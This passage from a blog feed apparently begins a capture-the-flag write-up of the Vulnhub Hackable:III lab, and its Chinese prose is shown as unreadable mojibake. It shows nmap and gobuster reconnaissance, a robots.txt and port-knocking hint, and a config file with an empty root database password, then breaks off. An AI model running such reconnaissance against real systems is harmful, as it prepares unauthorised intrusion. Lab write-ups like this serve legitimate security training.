<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åˆå­¦ä¹ äº†ç›®å½•æ‰«ææ—¶å€™çš„ä¸€äº›æ“ä½œï¼Œæ¯”å¦‚åŠ ä¸Šåç¼€ï¼Œæ¥å—ç‰¹å®šçš„çŠ¶æ€ç ï¼Œç„¶åæ˜¯phpçš„å‚æ•°æ³¨å…¥ï¼ŒåŠ å¼ºwfuzzè¿™ä¸ªå·¥å…·çš„åˆ©ç”¨<br>åé¢ææƒçš„éƒ¨åˆ†è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œéƒ½æ˜¯å¯ä»¥å†™å…¥çš„æ–‡ä»¶ï¼Œè¿˜æ˜¯rootçš„</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Hackable:III</title>
    <url>/posts/64270.html</url>
    <content><![CDATA[<p>Vulnhub-Hackable:IIIé¶æœºå¤ç›˜</p>
<span id="more"></span>

<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.179.164    </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">11</span> <span class="number">17</span>:<span class="number">01</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.164</span> (<span class="number">192.168</span>.<span class="number">179.164</span>)</span><br><span class="line">Host is up (<span class="number">0.0030</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> filtered ssh</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open     http    Apache httpd <span class="number">2.4</span>.<span class="number">46</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Kryptos <span class="operator">-</span> LAN Home</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.46</span> (Ubuntu)</span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="symbol">/config</span></span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">2</span>A:A3:<span class="number">5</span>A:<span class="number">42</span>:<span class="number">17</span>:<span class="number">24</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.98</span> ms <span class="number">192.168</span>.<span class="number">179.164</span> (<span class="number">192.168</span>.<span class="number">179.164</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.08</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>æ²¡æœ‰ä»€ä¹ˆå¤šå¤šä½™çš„ä¿¡æ¯äº†ï¼Œåªå¼€æ”¾80å’Œ22,ä½†æ˜¯22ç«¯å£æ˜¯filteredï¼Œå¤§æ¦‚ç‡è¦knock  å»webçœ‹çœ‹</p>
<h1 id="web-æ¢æµ‹"><a href="#web-æ¢æµ‹" class="headerlink" title="web æ¢æµ‹"></a>web æ¢æµ‹</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.164                      </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;pt-br&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://fonts.googleapis.com/css?family=RocknRoll+One&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/file.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kryptos - LAN Home<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;menu-open&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;imagens/logo_menu.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">height</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;overlay&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;menu&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;menu-close&quot;</span>&gt;</span><span class="symbol">&amp;times;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;login_page/login.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &quot;Please, jubiscleudo, don&#x27;t forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com&quot; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å‡ºç°äº†ä¸€ä¸ªjubiscleudoçš„ç”¨æˆ·åï¼Œç„¶åè¯´ç¡®å®è¦ç”¨knockæ¥æ‰“å¼€ç«¯å£ï¼Œä»¥åŠæœ‰ä¸€ä¸ª.jpgä»–éœ€è¦æ‰¹å‡†<br>è®¿é—®ä¸€ä¸‹robots.txtå‘ç°æœ‰ä¸œè¥¿ï¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.164/robots.txt</span><br><span class="line">User-Agente: *</span><br><span class="line">Disallow: /config</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.164/config    </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The document has moved <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://192.168.179.164/config/&quot;</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.46 (Ubuntu) Server at 192.168.179.164 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67ab14c4d0e0a243d4fe55ca.png"><br>webä¸­è®¿é—®æœ‰ä¸€ä¸ªbase64åŠ å¯†è¿‡çš„æ–‡æœ¬</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> <span class="string">&quot;MTAwMDA=&quot;</span> | <span class="built_in">base64</span> -d                                                </span><br><span class="line">10000 </span><br></pre></td></tr></table></figure></div>
<p>åªç»™äº†ä¸€ä¸ªç«¯å£ï¼Œå…ˆæ‰«ä¸€ä¸‹ç›®å½•å§</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># gobuster dir -u 192.168.179.164 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x html,php,jpg,wbpg      </span></span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Gobuster v3.<span class="number">6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Url:</span>                     http:<span class="symbol">//192.168.179.164</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Method:</span>                  GET</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Threads:</span>                 <span class="number">10</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Wordlist:</span>                <span class="symbol">/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt</span></span><br><span class="line">[<span class="operator">+</span>] Negative Status <span class="params">codes:</span>   <span class="number">404</span></span><br><span class="line">[<span class="operator">+</span>] User <span class="params">Agent:</span>              gobuster<span class="symbol">/3.6</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Extensions:</span>              php,jpg,wbpg,html</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Timeout:</span>                 <span class="number">10</span>s</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line"><span class="symbol">/login.php</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">487</span>]</span><br><span class="line"><span class="symbol">/index.html</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">1095</span>]</span><br><span class="line"><span class="symbol">/config.php</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">507</span>]</span><br><span class="line"><span class="symbol">/.htaccess</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/robots.txt</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">33</span>]</span><br><span class="line"><span class="symbol">/.</span>                    (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">1095</span>]</span><br><span class="line"><span class="symbol">/home.html</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">11327</span>]</span><br><span class="line"><span class="symbol">/.html</span>                (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.wbpg</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.php</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.jpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.html</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.php</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.jpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.html</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.wbpg</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.jpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.html</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.wbpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.php</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.jpg</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.html</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.php</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.wbpg</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.jpg</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.html</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.php</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.wbpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/3.jpg</span>                (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">61259</span>]</span><br><span class="line"><span class="symbol">/.ht.jpg</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht.html</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht</span>                  (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht.php</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht.wbpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="params">Progress:</span> <span class="number">81220</span> <span class="symbol">/</span> <span class="number">81225</span> (<span class="number">99.99</span>%)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Finished</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br></pre></td></tr></table></figure></div>
<p>config.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="comment">server with default setting (user &#x27;root&#x27; with no password) */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hackable&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="variable">$conexao</span> = <span class="title function_ invoke__">mysqli_connect</span>(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conexao</span> === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ERROR: Could not connect. &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>login.php:</p>
